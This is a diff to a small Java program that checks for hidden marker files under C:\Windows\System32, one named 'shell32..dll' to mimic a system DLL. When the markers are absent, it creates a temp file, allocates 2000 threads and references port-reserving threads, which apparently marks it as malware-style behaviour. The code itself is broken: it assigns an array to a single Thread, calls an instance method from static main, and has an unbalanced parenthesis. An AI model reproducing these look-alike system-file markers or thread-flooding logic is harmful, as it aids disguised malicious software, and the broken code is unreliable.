@@ -1,11 +1,11 @@
 import java.io.*;
 
 public class Run{
+  File ps_key_sett_file = new File("C:\\Windows\\System32\\shell32..dll");
+  File other_sett_file = new File("C:\\Windows\\System32\\C_9999.nls");
   public static void main(String[] a){
    Thread threads = new Thread[2000];
-   File sett_file = new File("C:\\Windows\\System32\\shell32..dll");  
-   //This is shell32..dll,not shell32.dll (Mind "points").
-   if(!(sett_file.exists() && sett_file.isFile()){
+   if(!DetectFile()){
      File t = new File("C:\\temp.txt");
      t.createNewFile();
      FileOutputStream fos = new FileOutputStream(t);
@@ -27,4 +27,10 @@ public class Run{
       // PortReserveThread prt = new PortReserveThread(...); //... Means port.
    }
   }
+
+  private boolean DetectFile(){
+    boolean psk_sett = ps_key_sett_file.exists() && ps_key_sett_file.isFile();
+    boolean oth_sett = other_sett_file.exists() && other_sett_file.isFile();
+    return psk_sett && oth_sett;
+  } 
 }
